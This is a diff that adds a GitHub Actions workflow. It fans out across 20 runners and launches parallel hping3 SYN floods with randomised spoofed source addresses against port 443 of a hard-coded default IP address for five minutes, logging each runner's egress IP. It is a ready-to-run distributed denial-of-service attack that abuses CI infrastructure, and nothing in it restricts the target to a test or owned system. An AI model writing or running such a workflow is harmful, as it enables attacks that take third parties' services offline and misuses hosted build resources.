@@ -1,0 +1,33 @@
+name: l4-syn
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'target IP'
+        default: '57.131.163.31'
+      seconds:
+        description: 'flood seconds'
+        default: '300'
+      procs:
+        description: 'parallel hping3 per runner'
+        default: '2'
+jobs:
+  syn:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - name: install hping3
+        run: sudo apt-get update -qq && sudo apt-get install -y hping3 >/dev/null
+      - name: flood
+        run: |
+          echo "runner ${{ matrix.n }} egress IP: $(curl -s --max-time 5 ifconfig.me)"
+          rm -f /tmp/hp.log
+          for i in $(seq 1 ${{ inputs.procs }}); do
+            sudo timeout -s INT ${{ inputs.seconds }} hping3 --flood -S -p 443 -d 0 --rand-source ${{ inputs.target }} >> /tmp/hp.log 2>&1 &
+          done
+          wait
+          grep transmitted /tmp/hp.log | head -5
